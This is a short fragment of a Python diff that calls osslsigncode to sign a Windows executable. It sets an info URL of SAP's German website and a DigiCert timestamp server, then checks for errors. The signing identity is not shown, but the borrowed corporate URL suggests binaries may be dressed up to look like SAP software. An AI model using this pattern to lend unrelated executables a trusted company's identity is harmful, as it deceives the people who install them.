+            "-i", "https://www.sap.com/germany/index.html",
+            "-t", "http://timestamp.digicert.com",
+            "-in", input_exe,
+            "-out", output_exe,
+        ],
+        check=False,
+        capture_output=True,
+        text=True,
+    )
+    if result.returncode != 0:
+        raise RuntimeError(
+            f"osslsigncode exited {result.returncode}\n"
+            f"stdout:\n{result.stdout}\n"
+            f"stderr:\n{result.stderr}"
+        )
+    if not pathlib.Path(output_exe).is_file():
+        raise RuntimeError(f"osslsigncode reported success but output missing: {output_exe}")
